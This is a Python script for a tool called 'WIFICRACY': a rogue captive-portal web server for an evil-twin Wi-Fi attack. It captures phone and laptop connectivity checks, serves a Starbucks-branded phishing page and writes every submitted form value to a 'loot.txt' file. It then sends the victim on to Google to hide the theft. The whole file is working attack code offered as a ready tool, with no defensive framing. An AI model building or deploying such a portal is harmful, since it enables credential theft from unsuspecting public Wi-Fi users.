#!/usr/bin/env python3
# ============================================================================
#               WIFICRACY: CUSTOM STANDALONE PORTAL WEB SERVER
# ============================================================================
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import sys

class WificracyPortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Automatically redirect standard mobile captive portal verification requests
        if any(x in self.path for x in ["generate_204", "ncsi.txt", "hotspot-detect.html", "success.txt"]):
            self.send_response(302)
            self.send_header('Location', 'http://10.0.0.1')
            self.end_headers()
            return

        if self.path == "/" or self.path == "":
            self.path = "/index.html"
            
        return super().do_GET()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print(f"\n[!] WIFICRACY CAPTURE TELEMETRY: {post_data}\n")
        
        # Write submitted form values directly to a local log file
        with open("/home/kali/wificracy/loot.txt", "a") as f:
            f.write(f"{post_data}\n")
            
        self.send_response(302)
        self.send_header('Location', 'https://google.com')
        self.end_headers()

def run_web_server(server_class=HTTPServer, handler_class=WificracyPortalHandler, port=80):
    template_dir = os.path.expanduser("~/wificracy/templates/starbucks")
    if os.path.exists(template_dir):
        os.chdir(template_dir)
    else:
        print(f"[-] Warning: Template directory missing at {template_dir}")
        
    try:
        server_address = ('', port)
        httpd = server_class(server_address, handler_class)
        print(f"[+] Autonomous Web Server hosting templates on HTTP Port {port}...")
        httpd.serve_forever()
    except PermissionError:
        print("[-] Server Failure: Root privileges required to bind to HTTP Port 80.")
        sys.exit(1)
    except (KeyboardInterrupt, SystemExit):
        print("\n[*] Shutting down Portal Web Server...")
        httpd.server_close()

if __name__ == "__main__":
    run_web_server()
    
